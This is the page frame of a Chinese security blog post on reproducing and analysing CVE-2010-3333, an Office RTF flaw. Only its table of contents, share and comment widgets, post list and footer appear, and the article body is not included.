                <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2020-12-20.CVE-2010-3333复现与分析.md" title="查看文章有关更新记录" target = "_blank">History</a><span class="raw">文本模式:</span><i class="fa fa-file-text-o"></i>
                <a href="https://raw.githubusercontent.com/Sp4n9x/blog_backup/blob/master/_posts/2020-12-20.CVE-2010-3333复现与分析.md" title="查看 & 下载文章 Markdown 原始文本" target = "_blank"> .md Raw</a>
            </p>
        
        <p>
            <span>原始链接:</span><a class="post-url" href="/2020/12/20/CVE-2010-3333复现与分析/" title="CVE-2010-3333复现与分析">http://sp4n9x.github.io/2020/12/20/CVE-2010-3333复现与分析/</a>
            <span class="copy-path" data-clipboard-text="原文: http://sp4n9x.github.io/2020/12/20/CVE-2010-3333复现与分析/　　作者: Sp4n9x" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>

    
    <nav id="article-nav">
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2020/08/15/ret2_dl_runtime_resolve详解/">
                    ret2_dl_runtime_resolve详解
                </a>
            </div>
        
    </nav>

  
</article>






    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-漏洞描述"><span class="toc-text">0x00 漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-分析环境"><span class="toc-text">0x10 分析环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20-漏洞复现"><span class="toc-text">0x20 漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x30-漏洞原理分析"><span class="toc-text">0x30 漏洞原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x31-RTF文件格式"><span class="toc-text">0x31 RTF文件格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、RTF简介"><span class="toc-text">1、RTF简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、RTF的组成"><span class="toc-text">2、RTF的组成</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1、RTF的基本元素"><span class="toc-text">2.1、RTF的基本元素</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2、RTF文件的内容"><span class="toc-text">2.2、RTF文件的内容</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x32-定位漏洞点"><span class="toc-text">0x32 定位漏洞点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、XP-amp-Office2003"><span class="toc-text">1、XP &amp; Office2003</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、Win7-amp-Office2007"><span class="toc-text">2、Win7&amp;Office2007</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x33-pFragments属性数据“6-5-”的含义及其合法值"><span class="toc-text">0x33 pFragments属性数据“6;5;”的含义及其合法值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x34-pFragments属性数据中“11111111acc8”的含义"><span class="toc-text">0x34 pFragments属性数据中“11111111acc8”的含义</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x40-漏洞利用"><span class="toc-text">0x40 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x41-方法一：覆盖返回地址"><span class="toc-text">0x41 方法一：覆盖返回地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x42-方法二：覆盖SEH记录"><span class="toc-text">0x42 方法二：覆盖SEH记录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、用户态的异常处理过程"><span class="toc-text">1、用户态的异常处理过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、SEH相关数据结构"><span class="toc-text">2、SEH相关数据结构</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1、TIB结构"><span class="toc-text">2.1、TIB结构</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2、-EXCEPTION-REGISTRATION-RECORD结构"><span class="toc-text">2.2、_EXCEPTION_REGISTRATION_RECORD结构</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3、-EXCEPTION-RECORD结构"><span class="toc-text">2.3、_EXCEPTION_RECORD结构</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4、-CONTEXT结构"><span class="toc-text">2.4、_CONTEXT结构</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-5、-EXCEPTION-POINTERS结构"><span class="toc-text">2.5、_EXCEPTION_POINTERS结构</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、计算偏移量"><span class="toc-text">3、计算偏移量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、SEH劫持过程分析"><span class="toc-text">4、SEH劫持过程分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x43-Office2003和Office2007-Exploit的通用性"><span class="toc-text">0x43 Office2003和Office2007 Exploit的通用性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x50-漏洞修复"><span class="toc-text">0x50 漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x60-Reference"><span class="toc-text">0x60 Reference</span></a></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-6 i,
        .toc-level-6 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"true"];
    </script>



    
    <div class="share">
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"CVE-2010-3333复现与分析　| Sp4n9x's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    </div>




    
        <section id="comments">
    <style> aside.comment-bar { margin: auto 30px; }</style>
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function () {
            this.page.url = 'http://sp4n9x.github.io/2020/12/20/CVE-2010-3333复现与分析/';
            this.page.identifier = '2020/12/20/CVE-2010-3333复现与分析/';
        };
        var loadComment = function() {
            var d = document, s = d.createElement('script');
            s.src = '//Sp4n9x.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        }
    </script>
    
    <script> loadComment(); </script>

</section>


<script id="dsq-count-scr" src="//Sp4n9x.disqus.com/count.js" async></script>
<span class="disqus-comment-count" data-disqus-identifier="2020/12/20/CVE-2010-3333复现与分析/"></span>
<span class="disqus-comment-count" data-disqus-url="http://sp4n9x.github.io/2020/12/20/CVE-2010-3333复现与分析/"></span>
<script>
    $(".disqus-comment-count").hide();
    var $disqusCount = $(".disqus-comment-count");
    $disqusCount.bind("DOMNodeInserted", function(e) {
        $(".count-comment").text(
            $(this).text().replace(/[^0-9]/ig,"")
        )
        DISQUSWIDGETS.getCount({reset: true});
    })
</script>

    




    <div class="scroll" id="post-nav-button">
        
            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2020/08/15/ret2_dl_runtime_resolve详解/" title="下一篇: ret2_dl_runtime_resolve详解">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/12/20/CVE-2010-3333复现与分析/">CVE-2010-3333复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/15/ret2_dl_runtime_resolve详解/">ret2_dl_runtime_resolve详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/19/RCTF2015——WriteUp(Pwn)/">RCTF2015——WriteUp(Pwn)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/05/ZCTF2016——WriteUp(Pwn)/">ZCTF2016——WriteUp(Pwn)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/08/ZIP文件格式分析/">ZIP文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/10/RAR文件格式分析/">RAR文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/11/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/">OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/26/护网杯2018——WriteUp/">护网杯2018——WriteUp</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/01/CVE-2010-2883复现与分析/">CVE-2010-2883复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/27/redhat2018—writeup/">redhat2018—writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/11/一步一步学ROP之Linux_x64篇-蒸米/">一步一步学ROP之Linux_x64篇-蒸米</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/10/一步一步学ROP之Linux_x86篇-蒸米/">一步一步学ROP之Linux_x86篇-蒸米</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/08/Kali2018-搜狗输入法安装/">Kali2018-搜狗输入法安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/05/Pwn环境搭建-Ubuntu16.04/">Pwn环境搭建——Ubuntu16.04</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/23/pwnable.kr/">pwnable.kr</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/27/MySQL宽字节注入/">MySQL宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/15/实验吧Wirteup合集/">实验吧WriteUp合集</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2018-2020 Sp4n9x
            </div>
            <div class="footer-right">
                <span> Sp4n9x's Blog <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
    </div>
</footer>
    </div>
    
    <script src="/js/GithubRepoWidget.js"></script>

<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 10;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





    <script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>

<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
             github: ".github-widget a", 
            
             post: ".article-entry a[href]", 
             tags: ".article-tag a", 
             categories: ".article-category a, a.tag-list-link", 
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>
<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
    <!-- 点击爱心效果 -->
    <script src="/js/love.js"></script>
  </div>
</body>
</html>